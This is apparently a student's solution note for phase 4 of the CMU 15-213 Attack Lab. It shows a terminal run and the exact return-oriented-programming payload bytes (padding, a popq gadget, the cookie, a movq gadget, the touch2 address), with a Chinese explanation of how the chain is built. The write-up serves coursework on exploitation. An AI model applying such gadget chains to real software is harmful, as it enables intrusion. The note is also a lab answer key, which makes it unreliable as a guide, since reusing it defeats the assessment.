## attacklab rtargetq1 (phase 4 in total)

```
fanzhipeng@LAPTOP-ILT6KOAH:~/work/cmu15213/attacklab$ ./rtarget -q -i rtarget1raw
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

这个实验中不能inject新代码，并且他的地址被随机化过，所以需要用已有的代码。根据提示，只需要两次，那么构造这样的语句popq %rax, ret; movq %rax, %rdi, ret;最后rdi的值和cookie一样，那么要求栈顶元素和cookie一样，所以我们首先找到 popq rax对应代码58的一个地址`4019cc`然后这个时候执行popq，所以接下来8字节就是cookie的数值

最后我们再找movq %rax, %rdi 对应的 48 89 c7, 找到了`4019a2`的地址，把他填到下一个八字节中，最后我们还需要返回touch2的地址，即把`4017ec`填到最后的8字节。


